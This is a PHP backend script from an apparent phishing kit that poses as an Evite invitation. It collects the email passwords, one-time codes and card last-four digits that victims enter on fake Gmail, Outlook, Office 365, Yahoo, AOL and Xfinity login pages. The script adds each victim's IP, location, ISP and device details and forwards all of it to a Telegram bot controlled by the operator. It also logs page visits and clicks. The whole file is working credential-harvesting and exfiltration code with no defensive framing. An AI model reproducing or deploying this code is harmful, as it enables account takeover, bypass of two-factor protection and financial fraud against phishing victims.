<?php
declare(strict_types=1);

require_once __DIR__ . '/../config.php';

header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');

// Prevent direct browser access - only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header("Location: ../404.php");
    exit();
}

// Basic Referer check (optional but recommended)
$referer = $_SERVER['HTTP_REFERER'] ?? '';
if ($referer === '' || strpos($referer, $_SERVER['HTTP_HOST']) === false) {
    // If you want to be extra strict, uncomment below:
    // header("Location: ../404.php");
    // exit();
}

function getClientIp(): string {
    $candidates = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($candidates as $k) {
        if (!empty($_SERVER[$k])) {
            $v = (string)$_SERVER[$k];
            if ($k === 'HTTP_X_FORWARDED_FOR') {
                $parts = array_map('trim', explode(',', $v));
                $v = (string)($parts[0] ?? $v);
            }
            return $v;
        }
    }
    return 'Unknown';
}

function telegramSendMessage(string $botToken, string $chatId, string $text): bool {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $payload = http_build_query([
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => 'true',
    ]);

    $ctx = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => $payload,
            'timeout' => 8,
        ],
    ]);

    $res = @file_get_contents($url, false, $ctx);
    return $res !== false;
}

function guessDeviceType(string $ua): string {
    $u = strtolower($ua);
    if ($u === '') return 'Unknown';
    if (str_contains($u, 'ipad') || str_contains($u, 'tablet')) return 'Tablet';
    if (str_contains($u, 'mobi') || str_contains($u, 'android') || str_contains($u, 'iphone') || str_contains($u, 'ipod')) return 'Mobile';
    return 'Desktop';
}

function guessBrowser(string $ua): string {
    $u = strtolower($ua);
    if ($u === '') return 'Unknown';
    if (str_contains($u, 'edg/')) return 'Edge';
    if (str_contains($u, 'opr/') || str_contains($u, 'opera')) return 'Opera';
    if (str_contains($u, 'chrome/') && !str_contains($u, 'edg/') && !str_contains($u, 'opr/')) return 'Chrome';
    if (str_contains($u, 'firefox/')) return 'Firefox';
    if (str_contains($u, 'safari/') && !str_contains($u, 'chrome/')) return 'Safari';
    if (str_contains($u, 'msie') || str_contains($u, 'trident/')) return 'Internet Explorer';
    return 'Unknown';
}

function ipLookupQuick(string $ip): array {
    $isLocal = ($ip === '127.0.0.1' || $ip === '::1' || str_starts_with($ip, '192.168.') || str_starts_with($ip, '10.') || str_starts_with($ip, '172.16.'));
    if ($isLocal || $ip === '' || $ip === 'Unknown') {
        return ['country' => 'Localhost', 'timezone' => 'UTC', 'isp' => 'Local Network'];
    }

    $url = 'http://ip-api.com/json/' . rawurlencode($ip) . '?fields=status,country,timezone,isp';
    $ctx = stream_context_create([
        'http' => [
            'method' => 'GET',
            'timeout' => 4,
            'header' => "Connection: close\r\nUser-Agent: Mozilla/5.0\r\n",
        ],
    ]);

    $res = @file_get_contents($url, false, $ctx);
    if ($res === false) return ['country' => '', 'timezone' => '', 'isp' => ''];

    $j = json_decode($res, true);
    if (!is_array($j) || ($j['status'] ?? '') !== 'success') {
        return ['country' => '', 'timezone' => '', 'isp' => ''];
    }

    return [
        'country' => (string)($j['country'] ?? ''),
        'timezone' => (string)($j['timezone'] ?? ''),
        'isp' => (string)($j['isp'] ?? ''),
    ];
}

const TELEGRAM_DIVIDER = '──────────────────────────────';

function tgEsc(string $value): string {
    return htmlspecialchars($value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

function limitSenderName(string $name, int $max = 28): string {
    $name = trim(preg_replace('/\s+/u', ' ', $name) ?? '');
    if ($name === '') return '';
    if (function_exists('mb_strlen') && mb_strlen($name) > $max) {
        return rtrim(mb_substr($name, 0, $max - 1)) . '…';
    }
    if (strlen($name) > $max) {
        return rtrim(substr($name, 0, $max - 1)) . '…';
    }
    return $name;
}

function formatTelegramSender(string $customSender, string $brandLabel): string {
    $custom = limitSenderName($customSender);
    if ($custom !== '' && strcasecmp($custom, $brandLabel) !== 0) {
        return $brandLabel . ' · ' . $custom;
    }
    return $brandLabel;
}

function providerMeta(string $provider): array {
    $id = strtolower(trim($provider));
    $map = [
        'google'    => ['tag' => 'GMAIL',     'label' => 'Gmail / Google', 'emoji' => '📧'],
        'gmail'     => ['tag' => 'GMAIL',     'label' => 'Gmail / Google', 'emoji' => '📧'],
        'outlook'   => ['tag' => 'OUTLOOK',   'label' => 'Outlook',        'emoji' => '📨'],
        'office365' => ['tag' => 'OFFICE365', 'label' => 'Office 365',     'emoji' => '🏢'],
        'yahoo'     => ['tag' => 'YAHOO',     'label' => 'Yahoo Mail',     'emoji' => '💜'],
        'aol'       => ['tag' => 'AOL',       'label' => 'AOL Mail',       'emoji' => '🔵'],
        'xfinity'   => ['tag' => 'XFINITY',   'label' => 'Xfinity',        'emoji' => '📡'],
        'other'     => ['tag' => 'OTHER',     'label' => 'Other Email',    'emoji' => '✉️'],
    ];

    if (isset($map[$id])) {
        return $map[$id];
    }

    if ($id === '' || $id === 'n/a') {
        return ['tag' => 'EVITE', 'label' => 'Evite', 'emoji' => '🎉'];
    }

    $tag = strtoupper(preg_replace('/[^a-z0-9]+/i', '', $id) ?? $id);
    return ['tag' => $tag, 'label' => strtoupper($id), 'emoji' => '✉️'];
}

function buildTelegramContextBlock(
    string $senderLine,
    string $providerLine,
    string $ip,
    string $country,
    string $isp,
    string $ts,
    string $deviceType,
    string $browserType
): string {
    $block = $senderLine . $providerLine;
    $block .= "🌐 <b>IP:</b> <code>{$ip}</code>\n";
    $block .= "🔗 <b>Lookup:</b> http://www.geoiptool.com/?IP={$ip}\n\n";
    if ($country !== '') $block .= "📍 <b>Location:</b> <code>" . tgEsc($country) . "</code>\n";
    if ($isp !== '') $block .= "🏢 <b>ISP:</b> <code>" . tgEsc($isp) . "</code>\n\n";
    $block .= "⏰ <b>Time:</b> <code>{$ts}</code>\n";
    $block .= "💻 <b>Device:</b> <code>" . tgEsc($deviceType . ' / ' . $browserType) . "</code>\n";
    $block .= "👨‍💻 <b>Source:</b> @redirectmiddle\n";
    return $block;
}

// 1. Handle Input (Supports both x-www-form-urlencoded and JSON)
$raw = file_get_contents('php://input');
$data = [];
if (strpos($_SERVER["CONTENT_TYPE"] ?? '', 'application/json') !== false) {
    $data = json_decode($raw, true) ?? [];
} else {
    $data = $_POST;
    if (!$data && $raw !== '') {
        parse_str($raw, $data);
        $data = is_array($data) ? $data : [];
    }
}

// 2. Extract Data
$event    = (string)($data['event'] ?? 'visit');
$email    = (string)($data['email'] ?? 'N/A');
$password = (string)($data['password'] ?? 'N/A');
$provider = (string)($data['provider'] ?? 'N/A');
$otp      = (string)($data['otp'] ?? 'N/A');
$last4    = (string)($data['last4'] ?? 'N/A');

$defaultSender = trim((string)($CONFIG['default_sender'] ?? 'Evite Guest Host'));
$senderInput = trim((string)($data['sender'] ?? ''));
$senderDisplay = formatTelegramSender($senderInput, $defaultSender);
$providerInfo = providerMeta($provider);

// 3. Common context
$IP       = getClientIp();
$useragent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$date     = gmdate('Y-m-d H:i:s') . ' UTC';
$deviceType = guessDeviceType((string)$useragent);
$browserType = guessBrowser((string)$useragent);
$ipMeta = ipLookupQuick((string)$IP);
$country = (string)($ipMeta['country'] ?? '');
$timezone = (string)($ipMeta['timezone'] ?? '');
$isp = (string)($ipMeta['isp'] ?? '');
$ts = date('H:i:s d/m/Y');

$senderLine = "🎟️ <b>Host:</b> <code>" . tgEsc($senderDisplay) . "</code>\n\n";
$providerLine = $providerInfo['emoji'] . " <b>Service:</b> <code>" . tgEsc($providerInfo['label']) . "</code>\n\n";

// 4. Visit / click notifications (optional)
$tg = $CONFIG['telegram'] ?? [];
$logVisits = (bool)($tg['log_visits'] ?? false);
$botToken = (string)($tg['bot_token'] ?? '');
$chatId = (string)($tg['chat_id'] ?? '');

if (($event === 'visit' || $event === 'click') && $logVisits) {
    $action = $event === 'click' ? '🖱️ <b>Provider Click</b>' : '👁️ <b>New Visit</b>';
    $msg = $action . "\n" . TELEGRAM_DIVIDER . "\n\n";
    $msg .= buildTelegramContextBlock($senderLine, $providerLine, $IP, $country, $isp, $ts, $deviceType, $browserType);
    $msg .= TELEGRAM_DIVIDER;

    $ok = ($botToken !== '' && $chatId !== '') ? telegramSendMessage($botToken, $chatId, $msg) : false;
    echo json_encode(['ok' => $ok, 'status' => 'logged', 'event' => $event]);
    exit;
}

// 5. Build notification with clean format
$providerTag = $providerInfo['tag'];

if ($event === 'otp') {
    $attempt = (string)($data['attempt'] ?? '1');
    $msgtg = "🔢 <b>{$providerTag} OTP</b>\n" . TELEGRAM_DIVIDER . "\n\n";
    $msgtg .= $senderLine;
    $msgtg .= $providerLine;
    $msgtg .= "👤 <b>Email:</b> <code>" . tgEsc($email) . "</code>\n";
    $msgtg .= "🔐 <b>OTP Code:</b> <code>" . tgEsc($otp) . "</code>\n";
    $msgtg .= "🔄 <b>Attempt:</b> <code>" . tgEsc($attempt) . "</code>\n\n";
    $msgtg .= buildTelegramContextBlock('', '', $IP, $country, $isp, $ts, $deviceType, $browserType);
    $msgtg .= TELEGRAM_DIVIDER;
} elseif ($event === 'last4') {
    $msgtg = "🔢 <b>{$providerTag} LAST 4 DIGITS</b>\n" . TELEGRAM_DIVIDER . "\n\n";
    $msgtg .= $senderLine;
    $msgtg .= $providerLine;
    $msgtg .= "👤 <b>Email:</b> <code>" . tgEsc($email) . "</code>\n";
    $msgtg .= "🔟 <b>Last 4 digits:</b> <code>" . tgEsc($last4) . "</code>\n\n";
    $msgtg .= buildTelegramContextBlock('', '', $IP, $country, $isp, $ts, $deviceType, $browserType);
    $msgtg .= TELEGRAM_DIVIDER;
} elseif ($event === 'resend_otp') {
    $msgtg = "♻️ <b>{$providerTag} Resend OTP</b>\n" . TELEGRAM_DIVIDER . "\n\n";
    $msgtg .= $senderLine;
    $msgtg .= $providerLine;
    $msgtg .= "👤 <b>Email:</b> <code>" . tgEsc($email) . "</code>\n\n";
    $msgtg .= buildTelegramContextBlock('', '', $IP, $country, $isp, $ts, $deviceType, $browserType);
    $msgtg .= TELEGRAM_DIVIDER;
} else {
    $msgtg = "🔐 <b>{$providerTag} Login</b>\n" . TELEGRAM_DIVIDER . "\n\n";
    $msgtg .= $senderLine;
    $msgtg .= $providerLine;
    $msgtg .= "📧 <b>Email:</b> <code>" . tgEsc($email) . "</code>\n";
    $msgtg .= "🔑 <b>Password:</b> <code>" . tgEsc($password) . "</code>\n\n";
    $msgtg .= buildTelegramContextBlock('', '', $IP, $country, $isp, $ts, $deviceType, $browserType);
    $msgtg .= TELEGRAM_DIVIDER;
}

// 6. Send to Telegram
$ok = ($botToken !== '' && $chatId !== '') ? telegramSendMessage($botToken, $chatId, $msgtg) : false;

// 7. Response
echo json_encode([
    'ok' => $ok,
    'status' => 'success',
    'message' => 'Processed',
    'event' => $event
]);
